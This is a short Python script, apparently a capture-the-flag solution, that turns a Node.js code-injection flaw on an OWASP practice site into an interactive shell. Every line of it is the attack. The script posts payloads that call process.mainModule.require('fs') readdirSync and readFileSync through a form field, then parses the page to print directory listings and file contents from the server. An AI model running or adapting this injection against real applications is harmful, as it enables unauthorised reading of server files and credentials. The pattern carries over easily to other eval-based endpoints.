#!/usr/bin/env python3

import readline
import requests


URL = 'https://naughty.owasp.si/'


while True:
    cmd = input('> ').split()
    if cmd[0] == 'ls':
        payload = "this.process.mainModule.require('fs').readdirSync('" + cmd[1] + "')"
    elif cmd[0] == 'cat':
        payload = "this.process.mainModule.require('fs').readFileSync('" + cmd[1] + "')"

    data = {
        'name': 0,
        'age': payload,
    }
    r = requests.post(URL, data=data)
    response = r.text
    #print(response)
    content = response.split('name="status" disabled value="0')[1].split('"><')[0]
    if cmd[0] == 'ls':
        print('\n'.join(content.split(',')))
    else:
        print(content)
    print()
